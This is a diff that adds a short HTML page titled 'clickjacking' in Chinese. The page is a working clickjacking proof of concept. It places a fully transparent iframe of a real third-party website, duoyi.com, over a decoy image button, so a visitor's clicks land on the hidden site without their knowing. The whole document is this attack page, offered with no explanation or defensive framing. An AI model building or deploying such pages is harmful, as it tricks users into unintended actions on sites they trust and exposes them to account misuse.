@@ -1,0 +1,39 @@
+<!DOCTYPE HTML>
+<html>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<head>
+<title>点击劫持</title>
+<style>
+html,body,iframe{
+display:block;
+height:100%;
+width:100%;
+margin:0;
+padding:0;
+border:none;
+}
+iframe{
+opacity:0.0;
+filter:alpha(opacity=0.0);
+-moz-opcity:0.0;
+opacity:0.0;
+position:absolute;
+z-index:2;
+}
+button{
+position:absolute;
+top:-5px;
+left:875px;
+z-index:1;
+width:72px;
+height:26px;
+}
+</style>
+</head>
+<body>
+<button>
+<img src="版本.jpg">
+</button>
+<iframe src="https://www.duoyi.com/"></iframe>
+</body>
+</html>
